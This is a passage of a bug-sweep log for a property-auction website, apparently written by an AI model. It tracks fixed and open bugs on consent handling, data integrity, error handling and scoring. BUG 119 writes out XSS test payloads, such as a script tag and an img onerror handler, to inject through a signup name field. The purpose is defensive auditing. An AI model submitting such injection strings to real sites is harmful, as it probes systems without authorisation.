**Area:** Enquiry Form — Data Integrity (Column Name Mismatch: `deal_data` vs `deal_data_json`)
**Severity:** High
**Description:** Persists from BUG 36. Server inserts into column `deal_data` (line 745) but the schema defines the column as `deal_data_json`. If the live Supabase table uses the schema column name, this field's data is silently dropped or the insert fails. The insert was recently updated to add `consent_given` (line 746) but the `deal_data` column name was not reconciled.
**Reproduction steps:**
1. Submit a lead with deal data
2. Check Supabase — `deal_data_json` column may be NULL while `deal_data` doesn't exist
**Suggested fix:** Change line 745 to `deal_data_json: dealData || null` if that matches the live table.
---

## BUG 114
**File:** bridgematch-lite.html line 855
**Area:** Enquiry Form — Validation (Consent Checkbox Not Pre-Checked But Also Not Required by HTML)
**Severity:** Low
**Description:** The consent checkbox at line 855 (`<input type="checkbox" id="leadConsent">`) is no longer pre-checked (BUG 6 was fixed). However, it also lacks the `required` HTML attribute. The JS validation at line 926 catches unchecked consent, but if JavaScript is disabled or the validation is somehow bypassed, the form could be submitted via native HTML form submission without consent. This is defence-in-depth only — the onclick handler calling `submitLead()` means native form submission isn't used, so the risk is theoretical.
**Reproduction steps:** Theoretical only — JS validation at line 926 catches this.
**Suggested fix:** Add `required` attribute for defence-in-depth: `<input type="checkbox" id="leadConsent" required>`.
---

## BUG 115
**File:** server.js line 2672 (Finance Check); bridgematch-lite.html line 464 (SDLT)
**Area:** Data Integrity — SDLT Formula Inconsistency Between Files (Now Both Correct)
**Severity:** Low (resolved — documentation only)
**Description:** Previous BUG 19/40 reported the SDLT formula in bridgematch-lite.html was critically wrong (using standard rates instead of investor surcharge rates). This has now been FIXED — line 464 now computes correct investor SDLT rates matching index.html's `calcSDLT()`. Both formulas now produce identical results for all price bands. No action needed.
**Reproduction steps:** N/A — fixed.
**Suggested fix:** N/A — verified as correct.
---

## Verification of Previously Logged Bugs (Sweeps 1-4):

### FIXED since last sweep (Sweep 4):
- **BUG 19/40** (SDLT wrong in bridgematch-lite): FIXED — line 464 now uses correct investor rates with 5% surcharge
- **BUG 58** (Name/phone not trimmed): FIXED — server.js line 728 trims name, line 730 trims phone
- **BUG 64** (Source field not stored): FIXED — line 731 now sets `source: source || 'bridgematch_lite'`
- **BUG 38** (Consent not stored): FIXED — line 746 now stores `consent_given: !!consent`
- **BUG 60** (Property type mapping incomplete): FIXED — line 2661 now uses regex with apartment/maisonette/mixed
- **BUG 62** (Negative bed count): FIXED — line 6659 now uses `Math.max(beds ?? 2, 0)`
- **BUG 51/61** (parseInt without radix): FIXED — line 2653 uses `parseInt(..., 10)` with nullish coalescing
- **BUG 6** (Consent pre-checked): FIXED — line 855 no longer has `checked` attribute

### STILL OPEN (confirmed on re-check):
- **BUG 2** (No rate limiting on /api/leads): Still open
- **BUG 3** (No spam protection): Still open — no honeypot, CAPTCHA, or Turnstile
- **BUG 7** (FCA placeholder): Still shows `[FCA_NUMBER_NEEDED]` at lines 829 and 986
- **BUG 15** (Street average mixes property types): Still open — line 6928 only filters `price > 0`
- **BUG 20/69/109** (VOA_RENTS first-match order bias): Still open — no specificity sorting
- **BUG 30** (Currency strings stored instead of integers): Still open — propertyPrice/loanAmount passed as-is
- **BUG 35** (Column name mismatch name vs investor_name): Still open — depends on live table schema
- **BUG 36/113** (deal_data vs deal_data_json): Still open
- **BUG 43** (calcDealAnalysis dead code): Still open — never wired to UI
- **BUG 65** (Yield/comparables not gated behind Coming Soon): Still open
- **BUG 99/108/112** (ec-note null reference): Still open
- **BUG 100/107/111** (Email capture consent hardcoded true): Still open
- **BUG 105/110** (Score not clamped after yield enrichment): Still open at line 6967

## Sweep completed at 2026-03-14T22:00:00Z

---

# Sweep 6 — 2026-03-14 (Opus 4.6)

## STATUS UPDATE — Previously Reported Bugs

### FIXED since Sweep 5 (verified by code inspection):
- **BUG 4/82/83** (Client-side email validation mismatch): FIXED — bridgematch-lite.html line 914 now uses `/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/` matching server regex. Index.html email capture line 2751 also uses same regex.
- **BUG 34/63/87** (Non-JSON error crashes handler): PARTIALLY FIXED — index.html email capture `.then()` now chains `.catch(()=>{throw new Error('Something went wrong')})` on `.json()` failure, providing a user-friendly fallback. However, bridgematch-lite.html line 976 still uses bare `res.json().then(d => { throw new Error(d.error || 'Submission failed'); })` with no `.catch()` on the `.json()` parse — so BridgeMatch Lite still crashes on non-JSON errors (e.g. 502 HTML responses).
- **BUG 85** (Consent not included in payload): FIXED — bridgematch-lite.html payload now includes `consent: !!consent` at line ~968.
- **BUG 38** (Consent not stored server-side): FIXED — server.js line 746 now stores `consent_given: !!consent`.
- **BUG 84** (Source stored redundantly in deal_data): FIXED — line 740 now uses `deal_data: dealData || null` without merging source into it.

### STILL OPEN (confirmed on re-check):

- **BUG 2** (No rate limiting on /api/leads): Still open — no rate limiting middleware on leads endpoint
- **BUG 3** (No spam protection): Still open — no honeypot, CAPTCHA, or Turnstile on any form
- **BUG 5/106** (Phone validation accepts non-digit input): Still open — client regex `/^\+?[\d\s()-]{10,15}$/` accepts strings of all parentheses or hyphens with zero digits. Server has no phone format check at all.
- **BUG 7** (FCA placeholder): Still shows `[FCA_NUMBER_NEEDED]` at lines 829 and 985
- **BUG 8** (No enquiry form on listing detail pages): Still open — only Finance Check widget exists
- **BUG 13** (Double submit possible): Still open — no `isSubmitting` guard flag in `submitLead()`
- **BUG 15** (Street average mixes property types): Still open — `relevantSales` only filters `price > 0`
- **BUG 20/69/79/109** (VOA_RENTS first-match order bias): Still open — no specificity sorting
- **BUG 30** (Currency strings stored instead of integers): Still open — `propertyPrice`/`loanAmount` passed as formatted strings to Supabase
- **BUG 42** (RLS policy grants full access to anon): Likely still present (schema-level — cannot verify live DB)
- **BUG 43** (calcDealAnalysis dead code): Still open — defined at line 2449 but never called from any UI element
- **BUG 56** (Activity log exposes PII): Still open — line 754 logs email and IP in activity events
- **BUG 74** (Street average is postcode-level, not street-level): Still open
- **BUG 76/94** (Welcome email XSS — firstName not escaped): Still open — line 815 uses `${firstName}` without `escHtml()`. The `escHtml()` function exists at line 26 but is not used in `sendWelcomeEmail()`.
- **BUG 80** (Yield score thresholds don't match CLAUDE.md): Still open — code uses +1.5/+0.5 at lines 6961/6964, CLAUDE.md documents +2.5/+1.5
- **BUG 99/108/112** (ec-note null reference): Still open — line 2765 calls `.querySelector('.ec-note').style.display = 'none'` but no `.ec-note` element exists in DOM. Throws TypeError on every successful email capture.
- **BUG 100/107/111** (Email capture consent hardcoded true): Still open — line 2758 sends `consent: true` hardcoded. The consent checkbox exists at line 1018 with `required` attribute, but `e.preventDefault()` at line 2741 bypasses HTML5 validation, and the JS handler never reads the checkbox state.
- **BUG 105/110** (Score not clamped after yield enrichment): Still open — line 6967 only rounds, does not clamp to 0-10 range

---

## BUG 116
**File:** bridgematch-lite.html line 976
**Area:** Enquiry Form — Error Handling (Non-JSON Server Error Still Not Handled in BridgeMatch Lite)
**Severity:** Medium
**Description:** While the index.html email capture form now handles non-JSON error responses gracefully (`.json().catch(()=>{throw new Error('Something went wrong')})`), the BridgeMatch Lite `submitLead()` function at line 976 still uses bare `.then(res => { if (!res.ok) return res.json().then(d => { throw new Error(d.error || 'Submission failed'); }); ... })`. If the server returns a non-JSON response (502 HTML error page from Railway), `res.json()` throws `SyntaxError: Unexpected token < in JSON at position 0`. This propagates to the `.catch()` handler at line 996 which displays `err.message` — the user sees the raw JSON parse error. The fix applied to index.html was not ported to bridgematch-lite.html.
**Reproduction steps:**
1. Simulate a 502 from the server during a BridgeMatch Lite lead submission
2. The error displayed is "Unexpected token < in JSON at position 0" instead of a friendly message
**Suggested fix:** Match the index.html pattern: `.then(res => { if(!res.ok) return res.json().then(d=>{throw new Error(d.error||'Submission failed')}).catch(()=>{throw new Error('Something went wrong')}); ... })`
---

## BUG 117
**File:** index.html line 2758; server.js line 746
**Area:** Email Capture Form — Compliance (Consent Checkbox Exists But State Never Transmitted)
**Severity:** Critical
**Description:** The email capture form now has a consent checkbox at line 1018 (`<input type="checkbox" name="consent" required>`). The server now correctly stores `consent_given: !!consent` (line 746). However, the JS handler `submitEmailCapture()` at line 2758 STILL hardcodes `consent: true` in the payload. The consent checkbox state is never read by the JS. This creates a dangerous false compliance posture: the infrastructure to track consent exists end-to-end (checkbox → payload → DB column), but the middle link is broken — the actual checkbox value is never read, and `true` is always sent. Under GDPR, this is worse than having no consent mechanism at all because it creates a false audit trail suggesting consent was given when it may not have been.
**Reproduction steps:**
1. Navigate to email capture form, enter name and email
2. Leave consent checkbox unchecked
3. Submit — form submits successfully (JS does not check the checkbox; `required` attribute is bypassed by `preventDefault()`)
4. Inspect network request — `consent: true` is sent regardless
5. Database records `consent_given: true` even though user did not consent
**Suggested fix:** In `submitEmailCapture()`, add: `const consentChecked = form.consent.checked; if (!consentChecked) { errEl.textContent = 'Please tick the consent checkbox.'; errEl.style.display = 'block'; btn.disabled = false; btn.textContent = 'Subscribe'; return false; }` Then change line 2758 to: `consent: consentChecked` instead of `consent: true`.
---

## BUG 118
**File:** index.html line 2765
**Area:** Email Capture Form — Runtime Error (Null Reference on .ec-note After Successful Submit)
**Severity:** Medium
**Description:** Persists from BUG 99/108/112. After successful email capture, line 2765 executes `document.querySelector('.ec-note').style.display = 'none'`. No element with class `ec-note` exists anywhere in the HTML DOM (only a CSS rule at line 409). `querySelector` returns `null`, and accessing `.style` on `null` throws `TypeError: Cannot read properties of null (reading 'style')`. This fires on EVERY successful email subscription. While the success UI renders correctly (lines 2763-2764 execute first), the unhandled error: (a) pollutes browser console, (b) could break error monitoring/Sentry alerting by generating noise, and (c) prevents any code after line 2765 from executing in the same `.then()` block.
**Reproduction steps:**
1. Submit email capture form with valid data
2. Success message appears correctly
3. Browser console shows: `TypeError: Cannot read properties of null (reading 'style')`
**Suggested fix:** Either remove line 2765 entirely (the element it references doesn't exist), or use optional chaining: `document.querySelector('.ec-note')?.style.display = 'none';`
---

## BUG 119
**File:** server.js line 815
**Area:** Welcome Email — XSS (firstName Not HTML-Escaped)
**Severity:** High
**Description:** Persists from BUG 76/94. The `sendWelcomeEmail()` function at line 815 interpolates `${firstName}` directly into HTML: `Welcome, ${firstName}!`. The `escHtml()` function is defined at line 26 and is correctly used in the lead notification email (lines 764-778), but is NOT used in the welcome email template. The `firstName` is derived from `(name || '').split(' ')[0]` at line 808 — no sanitisation. A user signing up with name `<script>alert(1)</script>` would have `<script>alert(1)</script>` injected into the HTML email. While most email clients strip `<script>` tags, `<img src=x onerror=alert(1)>` and similar payloads may execute in some clients. The lead notification email was fixed (BUG 1) but this separate code path was missed.
**Reproduction steps:**
1. Sign up with name `<b>Bold</b>Name` (no spaces, so full string becomes firstName)
2. Welcome email renders "Welcome, **Bold**Name!" with `<b>` tag interpreted as HTML
**Suggested fix:** Change line 815 from `Welcome, ${firstName}!` to `Welcome, ${escHtml(firstName)}!`
---

## BUG 120
**File:** bridgematch-lite.html line 860; lines 948-955
**Area:** Enquiry Form — Data Integrity (Currency Strings Sent as propertyPrice/loanAmount)
**Severity:** Medium
**Description:** Persists from BUG 30. The `submitLead()` onclick handler passes `encodeURIComponent(fmtCurrency(r.price))` (formatted string like `%C2%A3200%2C000` → decoded to `£200,000`). The payload at lines 950-951 decodes these: `propertyPrice: decodeURIComponent(price)`, `loanAmount: decodeURIComponent(loan)`. The server inserts `property_price: propertyPrice || null` at line 735 — storing the formatted string `"£200,000"` rather than the integer `200000`. If the Supabase `property_price` column is typed as `INTEGER`, this either fails silently (stored as NULL), coerces to 0, or throws an error. If typed as `TEXT`, the data cannot be queried numerically (e.g., "find all leads over £200k"). The `dealData` object at lines 960-963 also stores the formatted strings.
**Reproduction steps:**
1. Submit a BridgeMatch Lite lead for a £200,000 property
2. Check Supabase `leads` table — `property_price` column contains `"£200,000"` (string) or NULL (if integer column)
**Suggested fix:** Parse to integer server-side before insert: `property_price: propertyPrice ? parseInt(String(propertyPrice).replace(/[^0-9]/g, '')) || null : null`. Or send raw numeric values from the client instead of formatted currency strings.
---

## BUG 121
**File:** index.html line 2639
**Area:** Finance Widget — Data Integrity (lot.price.toLocaleString() Uses Browser Locale)
**Severity:** Low
**Description:** Persists from BUG 71/72. The Finance Check widget at line 2639 uses `lot.price.toLocaleString()` without specifying `'en-GB'` locale. For non-UK browser locales (German: `de-DE`, French: `fr-FR`), the price displays with wrong thousands separators — e.g., "£150.000" (German) instead of "£150,000". The bridgematch-lite.html version correctly uses `toLocaleString('en-GB', {maximumFractionDigits:0})`.
**Reproduction steps:**
1. Set browser locale to `de-DE`
2. Expand a lot detail — Finance Check shows "£150.000" which looks like £150
**Suggested fix:** Change to `lot.price.toLocaleString('en-GB')` at line 2639. Audit all other `.toLocaleString()` calls without locale in index.html.
---

## BUG 122
**File:** server.js line 6967; line 6484
**Area:** Scoring — Data Integrity (Score Exceeds 10 After Yield Enrichment — Confirmed Still Present)
**Severity:** Medium
**Description:** Confirmed persistence of BUG 105/110. Line 6484 correctly clamps: `L.score = Math.max(0, Math.min(10, Math.round(s * 10) / 10))`. Line 6947 also correctly clamps after belowMarket adjustments. But line 6967 only rounds: `lot.score = Math.round(lot.score * 10) / 10` — no clamping. A lot that scores 10.0 after initial+belowMarket capping, then receives +1.5 for >8% yield, would show score 11.5. The frontend badge at line 2515 shows the raw score, so users see scores above 10 on what appears to be a 0-10 scale.
**Reproduction steps:**
1. Find a lot with many positive signals (executor + derelict + freehold + development + below market 25%+) → score capped at 10.0
2. If the lot also has >8% yield → score += 1.5 → score = 11.5 (only rounded, not clamped)
**Suggested fix:** Change line 6967 to: `lot.score = Math.max(0, Math.min(10, Math.round(lot.score * 10) / 10));`
---

## BUG 123
**File:** bridgematch-lite.html line 860
**Area:** Enquiry Form — Data Integrity (propType Containing Single Quote Breaks onclick Handler)
**Severity:** Medium
**Description:** Persists from BUG 52 with confirmation. The submit button onclick at line 860 uses single-quoted string interpolation: `onclick="submitLead(...,'${r.propType||''}')"`. If `r.propType` contains a single quote (e.g., a Gemini-extracted type like `"Investor's Choice"` or `"Builder's Plot"`), the onclick attribute becomes `submitLead(...,'Investor's Choice')` — a JavaScript syntax error. The button would be non-functional with no visible error to the user. Property types are extracted by AI (Gemini) from auction house descriptions, so they can contain any characters.
**Reproduction steps:**
1. Process a lot where Gemini extracts propType as `"Builder's Plot"` or similar
2. The "Speak to a Broker" button's onclick handler has a syntax error
3. Clicking the button does nothing — no error shown, no form submission
**Suggested fix:** Escape single quotes in interpolated values: `'${(r.propType||'').replace(/'/g, "\\'")}'` or use `data-*` attributes instead of inline event handlers.
---

## Sweep completed at 2026-03-14T23:45:00Z
